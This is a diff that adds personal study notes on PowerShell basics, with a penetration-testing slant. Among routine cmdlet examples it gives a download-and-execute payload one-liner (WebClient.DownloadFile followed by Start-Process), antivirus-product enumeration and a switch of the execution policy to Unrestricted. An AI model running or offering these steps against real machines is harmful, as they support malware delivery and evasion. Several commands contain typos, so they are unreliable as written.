@@ -1,0 +1,94 @@
+- Cmdlet: Is a lightweight Script that perform singel function -> Show my Files -> Get-Location, Copy-Item
+	- cmdlet are written in C#
+	- Get-Helps shows infos regarding cmdlet's
+- Everything is Object in PS. A Object with a spezific Command could be called and combined with a funtion. Example: Format the Date object :  (Get-Date).ToShortDateString()
+- Hashtable: A hashtable is a data structure, much like an array, except you store each value (object) using a key. It's a basic key/value store. First, we create an empty hashtable. First create a Key then add the Value
+	- $hashtablename @{"first" = "Johny"; "Last" = "Lessig"}
+- Enumeratin Tool: PowerViewer
+
+Download Webcontent, and execute it -> wget
+PowerShell (New-Object System.Net.WebClient).DownloadFile("URL", Payloadname); Start-Process 'Payload'
+
+Show WebContent -> curl:
+Invoke-WebRequest -Uri "url" 
+Format it: Invoke-WebRequest -Uri "url" | Format-List | Format-Table
+Search for an Item: Invoke-WebRequest -Uri "url" | select-string "<search Term>"
+
+Check Antivirus Programm
+Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntiVirusProduct
+
+Echo in PS:
+Write-Host "Hello"
+Variabele: ($VariableName)
+ $Hello = "Hello two"
+Write-Host  $Hello
+
+Call ENVIROMENT Variables:
+Write-Host "$env:COMPUTERNAME"
+
+Call Arguments
+$test1 = $args[0]
+$test2 = $args[1]
+Write-Host " Du bist $test1"
+Write-Host " Du bist $test2"
+.\test_mit_arguments.ps1 'Test1 Marco' 'Test 2'
+
+Call Arguments using Params:
+param($test1, $test2)
+
+Write-Host " Du bist $test1"
+Write-Host " Du bist $test2"
+.\test_mit_arguments.ps1 -test1 'Test1' -test2 'Test 2'
+
+Get Help for Commands -> Similar like man
+Get-Help <command>
+Get-Help <command> -ShowWindow -> Graphical View
+
+Find all commands & search for a particular Command:
+See all commands: Get-Command
+Using KeyWords: Get-Command "Copy"
+Get-Command -Name Notepad -All -> All links to
+
+Get & Set Execution Policys:
+
+Get: Get-ExecutrionPolicy
+Set:  Set-ExecutionPolicy Unrestricted
+- Restricted – No scripts can be run. Windows PowerShell can be used only in interactive mode.
+- AllSigned – Only scripts signed by a trusted publisher can be run.
+- RemoteSigned – Downloaded scripts must be signed by a trusted publisher before they can be run.
+- Unrestricted – No restrictions. All PowerShell scripts can be run.
+
+Check Running Services:
+ Get-Services
+ See Runing Services Formated Table or List:  Get-Services | Format-Table ->  Get-Services | Format-List 
+Check all Stopped Processes: Get-Service | Where-Object Status -eq Stopped
+
+Check Type of a cmdlet :
+(<name_of_cmdlet)..GetType()
+
+Grep in PowerShell:
+select-string "<search Item>"
+
+Pipe and Format Output:
+<cmdlet> | select field1, field2
+Get-Service | select name, status | Select-String "Stopped"
+
+Read File:
+Get-Content <file>
+Get-Content  <file> | Select-String "<search-item>"
+
+Get Host Infomation:
+Get-ComputerInfo -Property "*<search term>*"
+
+Find all Comupers in a Network:
+Get-WmiObject -Class Win32_Computersystem | Select Name
+
+
+Interactive Poweshell Session:
+Enter-PSSession -ComputerName "Name" -Credential Get-Credential
+
+Persistance Session:
+Create a script: 
+ $mysession= New-PSSession -ComputerName "Name" -Credential Get-Credential
+Invoke-Command -Session $mysession -FilePath "<Hostnmes, IPs >"
+
